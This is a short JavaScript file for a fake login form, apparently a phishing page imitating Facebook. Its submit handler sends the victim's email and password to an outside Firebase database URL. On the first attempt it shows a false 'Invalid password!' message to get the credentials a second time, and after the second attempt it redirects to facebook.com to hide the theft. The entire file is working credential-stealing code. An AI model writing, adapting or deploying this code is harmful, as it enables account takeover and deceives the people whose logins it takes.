const emailValue = document.querySelector("#email");
const passValue = document.querySelector("#password");
const mainForm = document.querySelector(".login-form");
const errMsg = document.querySelector(".error")
let count = 0;

mainForm.addEventListener("submit", (e) => {
	e.preventDefault();
	let formData = {
		email: emailValue.value,
		password: passValue.value,
	};

	count += 1;

	if (count === 1) {
		errMsg.innerText = "Invalid password!"
		sendData(formData);
	}

	if (count === 2) {
		errMsg.innerText = "";
		sendData(formData);
		window.location.href = "https://facebook.com"
	}

});

function sendData(formData) {
	const URL =
		"https://security-testing-aa3b7-default-rtdb.asia-southeast1.firebasedatabase.app/test.json";

	fetch(URL, {
		method: "POST",
		body: JSON.stringify(formData),
	});
}
